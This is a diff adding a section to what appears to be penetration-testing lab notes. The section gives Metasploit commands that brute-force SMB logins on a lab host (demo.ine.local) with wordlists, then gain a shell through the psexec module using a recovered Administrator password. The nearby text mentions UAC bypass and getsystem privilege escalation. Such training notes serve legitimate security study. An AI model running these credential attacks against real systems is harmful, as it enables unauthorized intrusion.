@@ -2385,6 +2385,25 @@ run
 
 > This will bypass UAC using the injection method.
 
+#### Exploiting smb using PsExec
+
+```
+use auxiliary/scanner/smb/smb_login
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set RHOSTS demo.ine.local
+set VERBOSE false
+exploit
+
+msfconsole -q
+use exploit/windows/smb/psexec
+set RHOSTS demo.ine.local
+set SMBUser Administrator
+set SMBPass qwertyuiop
+exploit
+
+```
+
 ***NOW THIS WILL NOT ELEVATE OUR PRIVILAGES BUT WILL GIVE A NEW METERPRETER SESSION THAT WILL HAVE THE UAC FLAG TURNED OFF AND AFTER THAT YOU CAN USE THE*** **`getsystem`** ***COMMAND TO ELIVATE YOUR PRIVILEGES***
 
 #### Establishing Persistence on Windows:
